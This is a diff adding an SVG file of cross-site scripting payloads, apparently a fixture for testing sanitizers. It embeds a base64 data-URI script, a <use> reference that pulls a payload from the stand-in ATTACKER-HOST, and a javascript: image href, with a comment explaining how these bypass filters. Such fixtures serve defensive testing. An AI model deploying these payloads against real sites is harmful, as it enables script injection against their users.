@@ -1,0 +1,7 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
+  <!-- external/data <use> reference: pulls a fragment whose target carries the payload;
+       bypasses sanitizers that strip inline <script> but allow <use> + href -->
+  <use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD48L3N2Zz4=#x"/>
+  <use href="http://ATTACKER-HOST/xss.svg#payload"/>
+  <image href="javascript:alert(document.domain)"/>
+</svg>
